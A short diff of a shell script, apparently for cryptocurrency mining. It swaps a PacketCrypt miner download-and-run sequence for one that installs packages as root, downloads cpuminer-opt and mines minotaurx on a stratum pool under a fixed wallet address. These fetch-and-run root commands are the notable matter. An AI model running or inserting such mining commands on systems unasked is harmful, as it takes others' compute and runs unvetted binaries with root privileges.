@@ -1,5 +1,3 @@
 sudo su
-wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.5.1/packetcrypt-v0.5.1-linux_amd64
-chmod +x packetcrypt-v0.5.1-linux_amd64
-./packetcrypt-v0.5.1-linux_amd64 ann -p pkt1q6w43uf6x07qmz7kwklwnl6p7wncvmh7p3agkhw https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/master 2>&1 | grep --color=never -o "annmine.rs.*Ke.*"
-
+apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz && tar -xhf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RWq6cXxYKH6EFUqkM29JtFDKK4oX9w8Cve
